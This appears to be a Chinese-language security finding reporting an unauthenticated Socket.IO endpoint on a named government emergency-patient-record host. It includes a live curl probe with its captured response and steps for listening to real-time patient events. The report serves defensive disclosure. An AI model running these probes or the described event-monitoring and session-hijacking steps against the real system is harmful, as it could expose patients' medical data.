# 4000 端口 Socket.IO 未授权连接 - 暴露实时事件通道

- ID: `d53f6b75-cada-4ef4-b06f-d2616b4c2fd1`
- Severity: **medium**
- Status: open
- Type: Authentication Bypass
- Target: `https://epcr.tpf.gov.tw:4000/socket.io/`
- Conversation: `667feba8-aeb6-43db-baa4-1e16ab996122`
- Created: 2026-08-29 04:59:02.973390952+08:00

## Description

GET /socket.io/ 端点无需任何认证即可访问，返回 Socket.IO v4 连接信息，包含 sid（会话 ID）和 upgrades（升级选项）。攻击者可建立 Socket.IO 连接，监听或注入实时事件。

## Reproduction

1. 发送 GET 请求：`curl -sk "https://epcr.tpf.gov.tw:4000/socket.io/?EIO=4&transport=polling"`
2. 观察响应：HTTP 200 OK
3. 解析 JSON：包含 sid 和 upgrades
4. 建立 Socket.IO 连接：使用返回的 sid
5. 监听事件：实时接收 PCDT 事件

## Evidence

```
$ curl -sk "https://epcr.tpf.gov.tw:4000/socket.io/?EIO=4&transport=polling"
HTTP/1.1 200 OK
content-type: application/json
access-control-allow-credentials: true
cache-control: no-cache
x-frame-options: SAMEORIGIN
x-xss-protection: 0

0{"sid":"cBF46YK-lr2FOoy5AB_D","upgrades":["websocket"],"pingInterval":25000,"pingTimeout":5000}
```

关键泄露字段：
- **sid**: 会话 ID（cBF46YK-lr2FOoy5AB_D）
- **upgrades**: 支持的升级协议（websocket）
- **pingInterval**: 心跳间隔（25000ms）
- **pingTimeout**: 心跳超时（5000ms）

## Impact

**中等** - Socket.IO 未授权连接：
1. **实时事件监听**：攻击者可监听系统实时事件（如 PCDT 开始/结束）
2. **事件注入**：可能向服务器发送伪造事件
3. **会话劫持**：通过 sid 劫持其他用户的 Socket.IO 会话
4. **DoS 攻击**：建立大量 Socket.IO 连接消耗资源
5. **信息泄露**：通过监听事件获取患者实时状态

结合 /events 数据泄露，Socket.IO 未授权连接可帮助攻击者：
- 实时跟踪患者 PCDT 进度
- 发现新创建的病例
- 监控血压异常事件

## Recommendation

1. **添加认证**：要求 JWT Bearer Token
2. **验证 sid**：验证 sid 有效性
3. **速率限制**：限制连接频率
4. **事件过滤**：仅允许特定事件类型
5. **访问日志**：记录所有连接
